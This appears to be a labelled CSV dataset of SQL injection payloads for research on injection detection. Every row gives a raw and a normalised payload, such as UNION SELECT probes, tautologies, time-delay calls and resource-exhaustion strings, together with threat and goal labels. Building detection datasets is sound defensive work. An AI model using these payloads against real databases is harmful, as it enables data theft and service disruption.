10438,Modified_SQL_Dataset,C:\Users\Polyana\Documents\pesquisa-P2SQL\data\raw\Modified_SQL_Dataset.csv,1,"-4330' union all select 3059,3059,3059,3059,3059,3059,3059,3059,3059--","-4330' UNION ALL SELECT 3059,3059,3059,3059,3059,3059,3059,3059,3059--",injection_fragment,SELECT,,,T1,confidentiality,exfiltrate data,exfiltrate data from unknown_table,T1,,False,False,True,True,,,,,,,,,,,,T4,policy,bypass query constraints,bypass query constraints,comment_terminated_fragment,policy,False,False,False,True,False,False,False,False,True,False,,3
10296,Modified_SQL_Dataset,C:\Users\Polyana\Documents\pesquisa-P2SQL\data\raw\Modified_SQL_Dataset.csv,1,"1  )   where 7775  =  7775 union all select null,null,null,null--","1 ) WHERE 7775 = 7775 UNION ALL SELECT NULL,NULL,NULL,NULL--",injection_fragment,SELECT,,,T1,confidentiality,exfiltrate data,exfiltrate data from unknown_table,T1,,False,False,True,True,,,,,,,,,,,,T4,policy,bypass query constraints,bypass query constraints,comment_terminated_fragment,policy,False,False,False,True,False,False,False,False,True,False,,3
3323,Modified_SQL_Dataset,C:\Users\Polyana\Documents\pesquisa-P2SQL\data\raw\Modified_SQL_Dataset.csv,1,"-7238%' or make_set  (  5375  =  9563,9563  )   and '%'  =  '","-7238%' OR MAKE_SET ( 5375 = 9563,9563 ) AND '%' = '",injection_fragment,UNKNOWN,,,T?,unknown,unknown malicious action,unknown malicious action,,,True,False,True,True,,,,,,,,,,,,T4,policy,bypass query constraints,bypass query constraints,boolean_like_fragment,policy,False,False,False,False,False,False,False,True,True,False,,3
5651,Modified_SQL_Dataset,C:\Users\Polyana\Documents\pesquisa-P2SQL\data\raw\Modified_SQL_Dataset.csv,1,"-1187'  )   union all select 8202,8202,8202,8202,8202,8202,8202#","-1187' ) UNION ALL SELECT 8202,8202,8202,8202,8202,8202,8202#",injection_fragment,SELECT,,,T1,confidentiality,exfiltrate data,exfiltrate data from unknown_table,T1,,False,False,True,True,,,,,,,,,,,,T4,policy,bypass query constraints,bypass query constraints,comment_terminated_fragment,policy,False,False,False,True,False,False,False,False,True,False,,3
10845,Modified_SQL_Dataset,C:\Users\Polyana\Documents\pesquisa-P2SQL\data\raw\Modified_SQL_Dataset.csv,1,"call regexp_substring  (  repeat  (  right  (  char  (  3702  )  ,0  )  ,500000000  )  ,null  )   and ""rugr""  =  ""rugr","CALL REGEXP_SUBSTRING ( REPEAT ( RIGHT ( CHAR ( 3702 ) ,0 ) ,500000000 ) ,NULL ) AND ""RUGR"" = ""RUGR",injection_fragment,UNKNOWN,,,T?,unknown,unknown malicious action,unknown malicious action,,,True,False,True,True,,,,,,,,,,,,T4,policy,bypass query constraints,bypass query constraints,boolean_like_fragment,policy,False,False,False,False,False,False,False,True,True,False,,3
4894,Modified_SQL_Dataset,C:\Users\Polyana\Documents\pesquisa-P2SQL\data\raw\Modified_SQL_Dataset.csv,1,"1  )   where 8302  =  8302 or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5  )  --","1 ) WHERE 8302 = 8302 OR 2633 = DBMS_PIPE.RECEIVE_MESSAGE ( CHR ( 112 ) ||CHR ( 65 ) ||CHR ( 65 ) ||CHR ( 103 ) ,5 ) --",injection_fragment,UNKNOWN,,,T?,unknown,unknown malicious action,unknown malicious action,,,True,False,True,True,,,,,,,,,,,,T4,policy,bypass query constraints,bypass query constraints,comment_terminated_fragment,policy,False,False,False,True,False,False,False,True,True,False,,3
4071,Modified_SQL_Dataset,C:\Users\Polyana\Documents\pesquisa-P2SQL\data\raw\Modified_SQL_Dataset.csv,1,1'   )    )    and 4242  =  5831 and    (    (   'xflh' like 'xflh,1' ) ) AND 4242 = 5831 AND ( ( 'XFLH' LIKE 'XFLH,injection_fragment,UNKNOWN,,,T?,unknown,unknown malicious action,unknown malicious action,,,True,False,True,True,,,,,,,,,,,,T4,policy,bypass query constraints,bypass query constraints,boolean_like_fragment,policy,False,False,False,False,False,False,False,True,True,False,,3
4169,Modified_SQL_Dataset,C:\Users\Polyana\Documents\pesquisa-P2SQL\data\raw\Modified_SQL_Dataset.csv,1,1'   )    )     )   and 4595  =  4595#,1' ) ) ) AND 4595 = 4595#,injection_fragment,UNKNOWN,,,T?,unknown,unknown malicious action,unknown malicious action,,,True,False,True,True,,,,,,,,,,,,T4,policy,bypass query constraints,bypass query constraints,quote_termination_fragment,policy,False,False,False,True,False,False,False,True,True,False,,3
7240,Modified_SQL_Dataset,C:\Users\Polyana\Documents\pesquisa-P2SQL\data\raw\Modified_SQL_Dataset.csv,1,"1""   )    )    as eagr where 3366  =  3366 and elt  (  4249  =  4249,7259  )  --","1"" ) ) AS EAGR WHERE 3366 = 3366 AND ELT ( 4249 = 4249,7259 ) --",injection_fragment,UNKNOWN,,,T?,unknown,unknown malicious action,unknown malicious action,,,True,False,True,True,,,,,,,,,,,,T4,policy,bypass query constraints,bypass query constraints,comment_terminated_fragment,policy,False,False,False,True,False,False,False,True,True,False,,3
2317,Modified_SQL_Dataset,C:\Users\Polyana\Documents\pesquisa-P2SQL\data\raw\Modified_SQL_Dataset.csv,1,"-5379'  )   union all select 4294,4294,4294--","-5379' ) UNION ALL SELECT 4294,4294,4294--",injection_fragment,SELECT,,,T1,confidentiality,exfiltrate data,exfiltrate data from unknown_table,T1,,False,False,True,True,,,,,,,,,,,,T4,policy,bypass query constraints,bypass query constraints,comment_terminated_fragment,policy,False,False,False,True,False,False,False,False,True,False,,3
9521,Modified_SQL_Dataset,C:\Users\Polyana\Documents\pesquisa-P2SQL\data\raw\Modified_SQL_Dataset.csv,1,"1 where 6965  =  6965 and elt  (  3933  =  1232,1232  )  --","1 WHERE 6965 = 6965 AND ELT ( 3933 = 1232,1232 ) --",injection_fragment,UNKNOWN,,,T?,unknown,unknown malicious action,unknown malicious action,,,True,False,True,True,,,,,,,,,,,,T4,policy,bypass query constraints,bypass query constraints,comment_terminated_fragment,policy,False,False,False,True,False,False,False,True,True,False,,3
10071,Modified_SQL_Dataset,C:\Users\Polyana\Documents\pesquisa-P2SQL\data\raw\Modified_SQL_Dataset.csv,1,1'  )   and   (  3020  =  3020  )  *6703 and   (  'botl' like 'botl,1' ) AND ( 3020 = 3020 ) *6703 AND ( 'BOTL' LIKE 'BOTL,injection_fragment,UNKNOWN,,,T?,unknown,unknown malicious action,unknown malicious action,,,True,False,True,True,,,,,,,,,,,,T4,policy,bypass query constraints,bypass query constraints,boolean_like_fragment,policy,False,False,False,False,False,False,False,True,True,False,,3
4155,Modified_SQL_Dataset,C:\Users\Polyana\Documents\pesquisa-P2SQL\data\raw\Modified_SQL_Dataset.csv,1,"1"" where 4298  =  4298 order by 1--","1"" WHERE 4298 = 4298 ORDER BY 1--",injection_fragment,UNKNOWN,,,T?,unknown,unknown malicious action,unknown malicious action,,,True,False,True,True,,,,,,,,,,,,T4,policy,bypass query constraints,bypass query constraints,comment_terminated_fragment,policy,False,False,False,True,False,False,False,True,True,False,,3
7446,Modified_SQL_Dataset,C:\Users\Polyana\Documents\pesquisa-P2SQL\data\raw\Modified_SQL_Dataset.csv,1,"1'  )   and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )","1' ) AND 3202 = LIKE ( 'ABCDEFG',UPPER ( HEX ( RANDOMBLOB ( 500000000/2 ) ) ) )",injection_fragment,UNKNOWN,,,T?,unknown,unknown malicious action,unknown malicious action,,,True,False,True,True,,,,,,,,,,,,T4,policy,bypass query constraints,bypass query constraints,boolean_like_fragment,policy,False,False,False,False,False,False,False,True,True,False,,3
3935,Modified_SQL_Dataset,C:\Users\Polyana\Documents\pesquisa-P2SQL\data\raw\Modified_SQL_Dataset.csv,1,"1%'  )   and 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5  )   and   (  '%'  =  '","1%' ) AND 6537 = DBMS_PIPE.RECEIVE_MESSAGE ( CHR ( 76 ) ||CHR ( 116 ) ||CHR ( 117 ) ||CHR ( 65 ) ,5 ) AND ( '%' = '",injection_fragment,UNKNOWN,,,T?,unknown,unknown malicious action,unknown malicious action,,,True,False,True,True,,,,,,,,,,,,T4,policy,bypass query constraints,bypass query constraints,boolean_like_fragment,policy,False,False,False,False,False,False,False,True,True,False,,3
8412,Modified_SQL_Dataset,C:\Users\Polyana\Documents\pesquisa-P2SQL\data\raw\Modified_SQL_Dataset.csv,1,"-7083 union all select 7705,7705,7705,7705,7705#","-7083 UNION ALL SELECT 7705,7705,7705,7705,7705#",injection_fragment,SELECT,,,T1,confidentiality,exfiltrate data,exfiltrate data from unknown_table,T1,,False,False,True,True,,,,,,,,,,,,T4,policy,bypass query constraints,bypass query constraints,comment_terminated_fragment,policy,False,False,False,True,False,False,False,False,True,False,,3
1089,Modified_SQL_Dataset,C:\Users\Polyana\Documents\pesquisa-P2SQL\data\raw\Modified_SQL_Dataset.csv,1,"1 union all select null,null#","1 UNION ALL SELECT NULL,NULL#",injection_fragment,SELECT,,,T1,confidentiality,exfiltrate data,exfiltrate data from unknown_table,T1,,False,False,True,True,,,,,,,,,,,,T4,policy,bypass query constraints,bypass query constraints,comment_terminated_fragment,policy,False,False,False,True,False,False,False,False,True,False,,3
31697,sqliv2,C:\Users\Polyana\Documents\pesquisa-P2SQL\data\raw\sqliv2.csv,1,' or 1 --',' OR 1 --',injection_fragment,UNKNOWN,,,T?,unknown,unknown malicious action,unknown malicious action,,,True,False,True,True,,,,,,,,,,,,T4,policy,bypass query constraints,bypass query constraints,quote_termination_fragment,policy,False,False,False,True,False,False,False,True,True,False,,3
